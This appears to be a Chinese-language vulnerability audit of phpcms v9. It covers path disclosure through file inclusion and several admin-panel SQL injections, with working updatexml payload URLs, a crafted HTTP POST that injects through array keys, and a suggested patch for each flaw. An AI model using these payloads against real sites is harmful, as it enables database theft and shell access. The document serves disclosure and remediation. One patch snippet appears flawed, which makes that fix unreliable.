### 0x01 测试场景
1. 版本信息截图如下：

### 0x02 测试思路
测试者可以通过投稿或其他可能的方式提交存在漏洞的链接。一旦后台用户点击这些链接，系统将自动添加一个新的管理员（需要管理权限）或在特定条件下直接获取Shell。本文将详细说明几个漏洞点，并进行漏洞复现。

### 0x03 文件包含漏洞
此类漏洞在phpcms中较为常见，主要由于文件包含处理不当所致。尽管单独挖掘这类漏洞意义不大，但在尝试获取Shell时却至关重要。以下列举几种典型的漏洞情况。

#### 1.1 漏洞文件
- **文件路径**：`/phpcms/modules/content/sitemodel_field.php` 的 `edit` 方法
- **问题描述**：`$field_type` 变量未初始化就进行了文件包含操作。只有在满足特定条件时才会赋值。
- **触发方式**：请求 `/index.php?m=content&c=sitemodel_field&a=edit&modelid=&menuid=&pc_hash=xxxxx` 即可暴露路径。
- **修复方案**：
  - 修改 `/phpcms/modules/content/sitemodel_field.php` 第124行代码为：
    ```php
    if (is_file(MODEL_PATH . $formtype . DIRECTORY_SEPARATOR . 'config.inc.php')) {
        require (MODEL_PATH . $formtype . DIRECTORY_SEPARATOR . 'config.inc.php');
    }
    ```
  - **修改前后对比**：修改后无法再暴露路径。

#### 1.2 漏洞文件
- **文件路径**：`/phpcms/modules/formguide/formguide_field.php`
- **问题描述**：变量直接包含，导致路径暴露。
- **触发方式**：请求 `/index.php?m=formguide&c=formguide_field&a=public_field_setting` 即可暴露路径。
- **修复方案**：
  - 修改 `/phpcms/modules/formguide/formguide_field.php` 第300行代码为：
    ```php
    if (is_file(MODEL_PATH . $fieldtype . DIRECTORY_SEPARATOR . 'config.inc.php')) {
        require (MODEL_PATH . $fieldtype . DIRECTORY_SEPARATOR . 'config.inc.php');
    }
    ```
  - **修改前后对比**：修改后无法再暴露路径。

#### 1.3 漏洞文件
- **文件路径**：`/caches/configs/system.php`
- **问题描述**：未判断引入关系，导致该文件可以直接访问，从而暴露路径。
- **触发方式**：直接访问 `/cache/configs/system.php` 即可暴露路径。
- **修复方案**：
  - 在 `/caches/configs/system.php` 文件头部添加：
    ```php
    defined('IN_PHPCMS') or exit('No permission resources.');
    ```
  - **修改前后对比**：修改后无法再暴露路径。

### 0x04 后台注入漏洞
Phpcms 默认会对传递的 `$_GET` 和 `$_POST` 参数值进行 `addslashes` 转义处理，且大部分变量都会被单引号包裹，数值参数也会直接进行整数处理。因此，找到注入点较为困难。本次审计中，在前台没有发现新的注入点（之前 `parse_str` 函数曾出现过注入），但后台发现了几个注入点。虽然单独的后台注入作用有限，但如果当前数据库用户有写权限并知道路径，可以利用 `INTO OUTFILE` 获取 Shell。以下是三种类型的注入示例。

#### 4.1 未处理变量直接进入数据库查询
- **文件路径**：`/phpcms/modules/poster/poster.php` 的 `stat` 方法
- **问题描述**：第222行获取 `$group` 变量的值，未加单引号，直接传入数据库查询。
- **触发方式**：请求 `/index.php?m=poster&c=poster&a=stat&pc_hash=xxxxx&id=1&click=1&group=type%20ORDER%20BY%20(select%201=(updatexml(1,concat(0x5e24,(select%20user()),0x5e24),1)))%23`
- **数据库执行语句**：
  ```sql
  SELECT COUNT(*) AS num FROM `phpcmsv9`.`v9_poster_201707` 
  WHERE `pid`='1' AND `siteid`='1' AND `type`='1' GROUP BY `type` 
  ORDER BY (select 1=(updatexml(1,concat(0x5e24,(select user()),0x5e24),1)))#` LIMIT 1
  ```
- **修复方案**：
  - 修改 `/phpcms/modules/poster/poster.php` 第222和223行代码为：
    ```php
    if (in_array($_GET['group'], array('username', 'area', 'ip', 'referer', 'clicktime', 'type'))) {
        $group = " `".$_GET['group']."`";
        $fields = "*, COUNT(".$_GET['group'].") AS num";
        $order = " `num` DESC";
    } else {
        $group = " `type`";
        $fields = "*, COUNT(type) AS num";
        $order = " `num` DESC";
    }
    ```
  - **修改前后对比**：修改后无法再注入。

#### 4.2 直接传入数组导致的注入
- **文件路径**：`/phpcms/modules/content/sitemodel_field.php` 的 `add` 方法
- **问题描述**：第51行直接传入 `$_POST['info']` 数组，允许控制数组的键值。
- **调用链路**：
  - `\phpcms\libs\classes\model.class.php` 的 `insert` 方法
  - `\phpcms\libs\classes\db_mysqli.class.php` 的 `insert` 方法
  - 第193行对数组的键值调用 `add_special_char` 方法进行处理，但防护效果不佳。
- **测试过程**：
  - 在后台内容相关设置中选择一个模型进行字段管理，点击添加字段并抓包。
  - 请求示例：
    ```http
    POST /index.php?m=content&c=sitemodel_field&a=add HTTP/1.1
    Host: 192.168.99.127
    Content-Length: 856
    Cache-Control: max-age=0
    Origin: http://192.168.99.127
    Upgrade-Insecure-Requests: 1
    User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.115 Safari/537.36
    Content-Type: application/x-www-form-urlencoded
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
    DNT: 1
    Referer: http://192.168.99.127/index.php?m=content&c=sitemodel_field&a=add&modelid=12&menuid=59&pc_hash=hvTown
    Accept-Language: en,zh-CN;q=0.8,zh;q=0.6
    Cookie: 
    Connection: close

    info[formtype]=text&issystem=0&info[issystem]=0&info[field]=heiheihei9&info[name]=heiheiheihei&info[tips]=&setting[size]=50&setting[defaultvalue]=&setting[ispassword]=0&info[formattribute]=&info[css]=&info[minlength]=0&info[maxlength]=&info[pattern]=&pattern_select=&info[errortips]=&info[isunique]=0&info[isbase]=1&info[issearch]=0&info[isadd]=1&info[isfulltext]=1&info[isomnipotent]=0&info[isposition]=0&info[modelid]=12&dosubmit=%CC%E1%BD%BB&pc_hash=hvTown&info[`test`,`setting`,`siteid`,`unsetgroupids`,`unsetroleids`) VALUES ('text','0','heiheihei3','heiheiheihei'or updatexml(1,concat(0x7e,(version())),0) or'','','','','0','','','','0','1','0','1','1','0','0','12','1234\'','{\"size\":\"50\",\"defaultvalue\":\"\",\"ispassword\":\"0\"}','1','','')%23]=1234
    ```
- **修复建议**：
  - 指定传入 `insert` 的键值或限定 `$_POST['info']` 数组中的键为固定数组中的一个。
  - 修改 `/phpcms/modules/content/sitemodel_field.php` 第51行为：
    ```php
    $this->db->insert(array(
        'modelid' => $modelid,
        'field' => $field,
        'minlength' => $minlength,
        'maxlength' => $maxlength,
        'formtype' => $field_type,
        'setting' => $_POST['info']['setting'],
        'siteid' => $_POST['info']['siteid'],
        'unsetgroupids' => $_POST['info']['unsetgroupids'],
        'unsetroleids' => $_POST['info']
    ));
    ```
  - 或在第50行后添加：
    ```php
    $fields = array('modelid', 'field', 'minlength', 'maxlength', 'formtype', 'setting', 'siteid', 'unsetgroupids', 'unsetroleids');
    foreach ($_POST['info'] as $k => $value) {
        if (!in_array($k, $fields)) {
            unset($_POST['info'][$k]);
        }
    }
    ```
  - **修改前后对比**：修改后无法再注入。

#### 其他类似注入文件
- `/phpcms/modules/content/type_manage.php` 的 `add` 方法
- `/phpcms/modules/content/workflow.php` 的 `add` 和 `edit` 方法
- `/phpcms/modules/formguide/formguide.php` 的 `add` 和 `edit` 方法
- `/phpcms/modules/member/member.php` 的 `add` 方法
- `/phpcms/modules/member/member_menu.php` 的 `add` 和 `edit` 方法
- `/phpcms/modules/member/member_modelfield.php` 的 `add` 和 `edit` 方法

以上文件同样存在直接传入数组导致的注入问题，修复方法同上。